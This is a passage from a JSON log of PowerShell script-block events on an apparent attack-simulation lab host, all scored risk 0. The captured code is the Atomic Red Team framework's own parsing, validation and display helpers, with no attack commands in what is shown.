inputs):`n\" $final_command_get_prereq.trim() }\n        }\n    }\n    # Footer\n    Write-Host -ForegroundColor Magenta \"[!!!!!!!!END TEST!!!!!!!]`n`n\"\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.1554663+00:00",
      "event_id": 35710933,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 591,
      "full_command": "function Write-PrereqResults ($FailureReasons, $testId) {\n    if ($FailureReasons.Count -eq 0) {\n        Write-KeyValue \"Prerequisites met: \" $testId\n    }\n    else {\n        Write-Host -ForegroundColor Red \"Prerequisites not met: $testId\"\n        foreach ($reason in $FailureReasons) {\n            Write-Host -ForegroundColor Yellow -NoNewline \"`t[*] $reason\"\n        }\n        Write-Host -ForegroundColor Yellow -NoNewline \"`nTry installing prereq's with the \"\n        Write-Host -ForegroundColor Cyan -NoNewline \"-GetPrereqs\"\n        Write-Host -ForegroundColor Yellow  \" switch\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.1525126+00:00",
      "event_id": 35710930,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 392,
      "full_command": "function Write-KeyValue ($key, $value) {\n    Write-Host -ForegroundColor Cyan -NoNewline $key\n    $split = $value -split \"(#{[a-z-_A-Z]*})\"\n    foreach ($s in $split) {\n        if ($s -match \"(#{[a-z-_A-Z]*})\") {\n            Write-Host -ForegroundColor Red -NoNewline $s\n        }\n        else {\n            Write-Host -ForegroundColor Green -NoNewline $s\n        }\n    }\n    Write-Host \"\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.0882075+00:00",
      "event_id": 35711032,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 1266,
      "full_command": "class AtomicDependency {\n    [String] $description\n    [String] $prereq_command\n    [String] $get_prereq_command\n}\n\nclass AtomicInputArgument {\n    [String] $description\n    [String] $type\n    [String] $default\n}\n\nclass AtomicExecutorBase {\n    [String] $name\n    [Bool] $elevation_required\n\n    # Implemented to facilitate improved PS object display\n    [String] ToString() {\n        return $this.Name\n    }\n}\n\nclass AtomicExecutorDefault : AtomicExecutorBase {\n    [String] $command\n    [String] $cleanup_command\n}\n\nclass AtomicExecutorManual : AtomicExecutorBase {\n    [String] $steps\n    [String] $cleanup_command\n}\n\nclass AtomicTest {\n    [String] $name\n    [String] $auto_generated_guid\n    [String] $description\n    [String[]] $supported_platforms\n    # I wish this didn't have to be a hashtable but I don't\n    # want to change the schema and introduce a breaking change.\n    [Hashtable] $input_arguments\n    [String] $dependency_executor_name\n    [AtomicDependency[]] $dependencies\n    [AtomicExecutorBase] $executor\n\n    # Implemented to facilitate improved PS object display\n    [String] ToString() {\n        return $this.name\n    }\n}\n\nclass AtomicTechnique {\n    [String[]] $attack_technique\n    [String] $display_name\n    [AtomicTest[]] $atomic_tests\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.1495854+00:00",
      "event_id": 35710927,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 3119,
      "full_command": "function Invoke-CleanupDescription() {\n    $ret1 = $test.description.ToString().trim() -replace '(?<!\\n)\\n(?!\\n)', ' ' #replace single linefeeds with a space\n    $ret1 -replace '\\n\\n', \"`n\" #replace double linefeeds with a single linefeed\n}\nfunction Show-Details ($test, $testCount, $technique, $customInputArgs, $PathToAtomicsFolder) {\n    # Header info\n    $tName = $technique.display_name.ToString() + \" \" + $technique.attack_technique\n    Write-Host -ForegroundColor Magenta \"[********BEGIN TEST*******]\"\n    Write-KeyValue \"Technique: \"  $tName\n    Write-KeyValue \"Atomic Test Name: \" $test.name.ToString()\n    Write-KeyValue \"Atomic Test Number: \" $testCount\n    if ($test.auto_generated_guid) { Write-KeyValue \"Atomic Test GUID: \" $test.auto_generated_guid }\n    Write-KeyValue \"Description: \" $(Invoke-CleanupDescription $test)\n\n    # Attack Commands\n    Write-Host -ForegroundColor Yellow \"`nAttack Commands:\"\n    $elevationRequired = $false\n    if ($nul -ne $test.executor.elevation_required ) { $elevationRequired = $test.executor.elevation_required }\n    $executor_name = $test.executor.name\n    Write-KeyValue \"Executor: \" $executor_name\n    Write-KeyValue \"ElevationRequired: \" $elevationRequired\n    $final_command = Merge-InputArgs $test.executor.command $test $customInputArgs $PathToAtomicsFolder\n    Write-KeyValue \"Command:`n\" $test.executor.command.trim()\n    if ($test.executor.command -ne $final_command) { Write-KeyValue \"Command (with inputs):`n\" $final_command.trim() }\n\n    # Cleanup Commands\n    if ($nul -ne $test.executor.cleanup_command) {\n        Write-Host -ForegroundColor Yellow \"`nCleanup Commands:\"\n        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $customInputArgs $PathToAtomicsFolder\n        Write-KeyValue \"Command:`n\" $test.executor.cleanup_command.trim()\n        if ($test.executor.cleanup_command -ne $final_command) { Write-KeyValue \"Command (with inputs):`n\" $final_command.trim() }\n    }\n\n    # Dependencies\n    if ($nul -ne $test.dependencies) {\n        Write-Host -ForegroundColor Yellow \"`nDependencies:\"\n        foreach ($dep in $test.dependencies) {\n            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder\n            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $customInputArgs $PathToAtomicsFolder\n            $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder\n            Write-KeyValue \"Description: \" $description.trim()\n            Write-KeyValue \"Check Prereq Command:`n\" $dep.prereq_command.trim()\n            if ( $dep.prereq_command -ne $final_command_prereq ) { Write-KeyValue \"Check Prereq Command (with inputs):`n\" $final_command_prereq.trim() }\n            Write-KeyValue \"Get Prereq Command:`n\" $dep.get_prereq_command.trim()\n            if ( $dep.get_prereq_command -ne $final_command_get_prereq ) { Write-KeyValue \"Get Prereq Command (with inputs):`n\" $final_command_get_prereq.trim() }\n        }\n    }\n    # Footer\n    Write-Host -ForegroundColor Magenta \"[!!!!!!!!END TEST!!!!!!!]`n`n\"\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:45.5762487+00:00",
      "event_id": 35709042,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 16,
      "full_command": "{ Test-Path $_ }",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2018449+00:00",
      "event_id": 35711057,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 10667,
      "full_command": "ingsWithPotentialInputArgs.Add($Dependency['prereq_command'])\n\n                    if (-not $Dependency.ContainsKey('get_prereq_command')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element is required.\"\n                        return\n                    }\n\n                    if (-not ($Dependency['get_prereq_command'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element must be a string.\"\n                        return\n                    }\n\n                    $DependencyInstance.get_prereq_command = $Dependency['get_prereq_command']\n                    $StringsWithPotentialInputArgs.Add($Dependency['get_prereq_command'])\n\n                    $Dependencies[$j] = $DependencyInstance\n\n                    $j++\n                }\n\n                $AtomicTestInstance.dependencies = $Dependencies\n            }\n\n            if ($AtomicTest.ContainsKey('dependency_executor_name')) {\n                if ($ValidExecutorTypes -notcontains $AtomicTest['dependency_executor_name']) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependency_executor_name': '$($AtomicTest['dependency_executor_name'])' must be one of the following: $($ValidExecutorTypes -join ', ').\"\n                    return\n                }\n\n                if ($null -eq $AtomicTestInstance.Dependencies) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] If 'atomic_tests[$i].dependency_executor_name' is defined, there must be at least one dependency defined.\"\n                }\n\n                $AtomicTestInstance.dependency_executor_name = $AtomicTest['dependency_executor_name']\n            }\n\n            $InputArguments = $null\n\n            # input_arguments is optional\n            if ($AtomicTest.ContainsKey('input_arguments')) {\n                if (-not ($AtomicTest['input_arguments'] -is [Hashtable])) {\n                    $AtomicTest['input_arguments'].GetType().FullName\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must be a hashtable.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['input_arguments'].Count)) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must have at least one entry.\"\n                    return\n                }\n\n                $InputArguments = @{}\n\n                $j = 0\n\n                foreach ($InputArgName in $AtomicTest['input_arguments'].Keys) {\n\n                    $InputArgument = [AtomicInputArgument]::new()\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('description')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element is required.\"\n                        return\n                    }\n\n                    if (-not ($AtomicTest['input_arguments'][$InputArgName]['description'] -is [String])) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element must be a string.\"\n                        return\n                    }\n\n                    $InputArgument.description = $AtomicTest['input_arguments'][$InputArgName]['description']\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('type')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type' element is required.\"\n                        return\n                    }\n\n                    if ($ValidInputArgTypes -notcontains $AtomicTest['input_arguments'][$InputArgName]['type']) {\n                        Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type': '$($AtomicTest['input_arguments'][$InputArgName]['type'])' should be one of the following: $($ValidInputArgTypes -join ', ')\"\n                    }\n\n                    $InputArgument.type = $AtomicTest['input_arguments'][$InputArgName]['type']\n\n                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('default')) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].default' element is required.\"\n                        return\n                    }\n\n                    $InputArgument.default = $AtomicTest['input_arguments'][$InputArgName]['default']\n\n                    $InputArguments[$InputArgName] = $InputArgument\n\n                    $j++\n                }\n            }\n\n            $AtomicTestInstance.input_arguments = $InputArguments\n\n            if (-not $AtomicTest.ContainsKey('executor')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['executor'] -is [Hashtable])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element must be a hashtable.\"\n                return\n            }\n\n            if (-not $AtomicTest['executor'].ContainsKey('name')) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.name' element is required.\"\n                return\n            }\n\n            if (-not ($AtomicTest['executor']['name'] -is [String])) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be a string.\"\n                return\n            }\n\n            if ($AtomicTest['executor']['name'] -notmatch '^(?-i:[a-z_]+)$') {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be lowercased and underscored.\"\n                return\n            }\n\n            if ($ValidExecutorTypes -notcontains $AtomicTest['executor']['name']) {\n                Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name': '$($AtomicTest['executor']['name'])' must be one of the following: $($ValidExecutorTypes -join ', ')\"\n                return\n            }\n\n            if ($AtomicTest['executor']['name'] -eq 'manual') {\n                if (-not $AtomicTest['executor'].ContainsKey('steps')) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element is required when the 'manual' executor is used.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['executor']['steps'] -is [String])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element must be a string.\"\n                    return\n                }\n\n                $ExecutorInstance = [AtomicExecutorManual]::new()\n                $ExecutorInstance.steps = $AtomicTest['executor']['steps']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['steps'])\n            }\n            else {\n                if (-not $AtomicTest['executor'].ContainsKey('command')) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element is required when the '$($ValidExecutorTypes -join ', ')' executors are used.\"\n                    return\n                }\n\n                if (-not ($AtomicTest['executor']['command'] -is [String])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element must be a string.\"\n                    return\n                }\n\n                $ExecutorInstance = [AtomicExecutorDefault]::new()\n                $ExecutorInstance.command = $AtomicTest['executor']['command']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['command'])\n            }\n\n            # cleanup_command element is optional\n            if ($AtomicTest['executor'].ContainsKey('cleanup_command')) {\n                $ExecutorInstance.cleanup_command = $AtomicTest['executor']['cleanup_command']\n                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['cleanup_command'])\n            }\n\n            # elevation_required element is optional\n            if ($AtomicTest['executor'].ContainsKey('elevation_required')) {\n                if (-not ($AtomicTest['executor']['elevation_required'] -is [Bool])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.elevation_required' element must be a boolean.\"\n                    return\n                }\n\n                $ExecutorInstance.elevation_required = $AtomicTest['executor']['elevation_required']\n            }\n            else {\n                # if elevation_required is not present, default to false\n                $ExecutorInstance.elevation_required = $False\n            }\n\n            $InputArgumentNames = $null\n\n            # Get all input argument names\n            $InputArgumentNames = $InputArguments.Keys\n\n            # Extract all input arguments names from the executor\n            # Potential places where input arguments can be populated:\n            #  - Dependency description\n            #  - Dependency prereq_command\n            #  - Dependency get_prereq_command\n            #  - Executor steps\n            #  - Executor command\n            #  - Executor cleanup_command\n\n            $Regex = [Regex] '#\\{(?<ArgName>[^}]+)\\}'\n            [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |\n            ForEach-Object { $Regex.Matches($_) } |\n            Select-Object -ExpandProperty Groups |\n            Where-Object { $_.Name -eq 'ArgName' } |\n            Select-Object -ExpandProperty Value |\n            Sort-Object -Unique\n\n\n            # Validate ",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 2,
      "message_total": 3,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2800504+00:00",
      "event_id": 35710736,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 3119,
      "full_command": "function Invoke-CleanupDescription() {\n    $ret1 = $test.description.ToString().trim() -replace '(?<!\\n)\\n(?!\\n)', ' ' #replace single linefeeds with a space\n    $ret1 -replace '\\n\\n', \"`n\" #replace double linefeeds with a single linefeed\n}\nfunction Show-Details ($test, $testCount, $technique, $customInputArgs, $PathToAtomicsFolder) {\n    # Header info\n    $tName = $technique.display_name.ToString() + \" \" + $technique.attack_technique\n    Write-Host -ForegroundColor Magenta \"[********BEGIN TEST*******]\"\n    Write-KeyValue \"Technique: \"  $tName\n    Write-KeyValue \"Atomic Test Name: \" $test.name.ToString()\n    Write-KeyValue \"Atomic Test Number: \" $testCount\n    if ($test.auto_generated_guid) { Write-KeyValue \"Atomic Test GUID: \" $test.auto_generated_guid }\n    Write-KeyValue \"Description: \" $(Invoke-CleanupDescription $test)\n\n    # Attack Commands\n    Write-Host -ForegroundColor Yellow \"`nAttack Commands:\"\n    $elevationRequired = $false\n    if ($nul -ne $test.executor.elevation_required ) { $elevationRequired = $test.executor.elevation_required }\n    $executor_name = $test.executor.name\n    Write-KeyValue \"Executor: \" $executor_name\n    Write-KeyValue \"ElevationRequired: \" $elevationRequired\n    $final_command = Merge-InputArgs $test.executor.command $test $customInputArgs $PathToAtomicsFolder\n    Write-KeyValue \"Command:`n\" $test.executor.command.trim()\n    if ($test.executor.command -ne $final_command) { Write-KeyValue \"Command (with inputs):`n\" $final_command.trim() }\n\n    # Cleanup Commands\n    if ($nul -ne $test.executor.cleanup_command) {\n        Write-Host -ForegroundColor Yellow \"`nCleanup Commands:\"\n        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $customInputArgs $PathToAtomicsFolder\n        Write-KeyValue \"Command:`n\" $test.executor.cleanup_command.trim()\n        if ($test.executor.cleanup_command -ne $final_command) { Write-KeyValue \"Command (with inputs):`n\" $final_command.trim() }\n    }\n\n    # Dependencies\n    if ($nul -ne $test.dependencies) {\n        Write-Host -ForegroundColor Yellow \"`nDependencies:\"\n        foreach ($dep in $test.dependencies) {\n            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder\n            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $customInputArgs $PathToAtomicsFolder\n            $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder\n            Write-KeyValue \"Description: \" $description.trim()\n            Write-KeyValue \"Check Prereq Command:`n\" $dep.prereq_command.trim()\n            if ( $dep.prereq_command -ne $final_command_prereq ) { Write-KeyValue \"Check Prereq Command (with inputs):`n\" $final_command_prereq.trim() }\n            Write-KeyValue \"Get Prereq Command:`n\" $dep.get_prereq_command.trim()\n            if ( $dep.get_prereq_command -ne $final_command_get_prereq ) { Write-KeyValue \"Get Prereq Command (with inputs):`n\" $final_command_get_prereq.trim() }\n        }\n    }\n    # Footer\n    Write-Host -ForegroundColor Magenta \"[!!!!!!!!END TEST!!!!!!!]`n`n\"\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2832183+00:00",
      "event_id": 35710739,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 392,
      "full_command": "function Write-KeyValue ($key, $value) {\n    Write-Host -ForegroundColor Cyan -NoNewline $key\n    $split = $value -split \"(#{[a-z-_A-Z]*})\"\n    foreach ($s in $split) {\n        if ($s -match \"(#{[a-z-_A-Z]*})\") {\n            Write-Host -ForegroundColor Red -NoNewline $s\n        }\n        else {\n            Write-Host -ForegroundColor Green -NoNewline $s\n        }\n    }\n    Write-Host \"\"\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2863405+00:00",
      "event_id": 35710742,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 591,
      "full_command": "function Write-PrereqResults ($FailureReasons, $testId) {\n    if ($FailureReasons.Count -eq 0) {\n        Write-KeyValue \"Prerequisites met: \" $testId\n    }\n    else {\n        Write-Host -ForegroundColor Red \"Prerequisites not met: $testId\"\n        foreach ($reason in $FailureReasons) {\n            Write-Host -ForegroundColor Yellow -NoNewline \"`t[*] $reason\"\n        }\n        Write-Host -ForegroundColor Yellow -NoNewline \"`nTry installing prereq's with the \"\n        Write-Host -ForegroundColor Cyan -NoNewline \"-GetPrereqs\"\n        Write-Host -ForegroundColor Yellow  \" switch\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.3013452+00:00",
      "event_id": 35710751,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 9,
      "full_command": "$global:?",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.3173063+00:00",
      "event_id": 35710756,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 9,
      "full_command": "$global:?",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.5771863+00:00",
      "event_id": 35710810,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 58,
      "full_command": ". 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.2743275+00:00",
      "event_id": 35710515,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 1266,
      "full_command": "class AtomicDependency {\n    [String] $description\n    [String] $prereq_command\n    [String] $get_prereq_command\n}\n\nclass AtomicInputArgument {\n    [String] $description\n    [String] $type\n    [String] $default\n}\n\nclass AtomicExecutorBase {\n    [String] $name\n    [Bool] $elevation_required\n\n    # Implemented to facilitate improved PS object display\n    [String] ToString() {\n        return $this.Name\n    }\n}\n\nclass AtomicExecutorDefault : AtomicExecutorBase {\n    [String] $command\n    [String] $cleanup_command\n}\n\nclass AtomicExecutorManual : AtomicExecutorBase {\n    [String] $steps\n    [String] $cleanup_command\n}\n\nclass AtomicTest {\n    [String] $name\n    [String] $auto_generated_guid\n    [String] $description\n    [String[]] $supported_platforms\n    # I wish this didn't have to be a hashtable but I don't\n    # want to change the schema and introduce a breaking change.\n    [Hashtable] $input_arguments\n    [String] $dependency_executor_name\n    [AtomicDependency[]] $dependencies\n    [AtomicExecutorBase] $executor\n\n    # Implemented to facilitate improved PS object display\n    [String] ToString() {\n        return $this.name\n    }\n}\n\nclass AtomicTechnique {\n    [String[]] $attack_technique\n    [String] $display_name\n    [AtomicTest[]] $atomic_tests\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.0037068+00:00",
      "event_id": 35710496,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 650,
      "full_command": "function Initialize-Assemblies {\n    $requiredTypes = @(\n        \"Parser\", \"MergingParser\", \"YamlStream\",\n        \"YamlMappingNode\", \"YamlSequenceNode\",\n        \"YamlScalarNode\", \"ChainedEventEmitter\",\n        \"Serializer\", \"Deserializer\", \"SerializerBuilder\",\n        \"StaticTypeResolver\"\n    )\n\n    $type = \"YamlDotNet.Serialization.Serializer\" -as [type]\n    if (!$type) {\n        return Load-Assembly\n    }\n\n    $yaml = $type.Assembly\n    foreach ($i in $requiredTypes){\n        if ($i -notin $yaml.DefinedTypes.Name) {\n            Throw \"YamlDotNet is loaded but missing required types ($i). Older version installed on system?\"\n        }\n    }\n}",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:59.1473791+00:00",
      "event_id": 35711189,
      "risk_score": 0,
      "detected_patterns": "",
      "pattern_details": "",
      "command_length": 6,
      "full_command": "prompt",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    }
  ]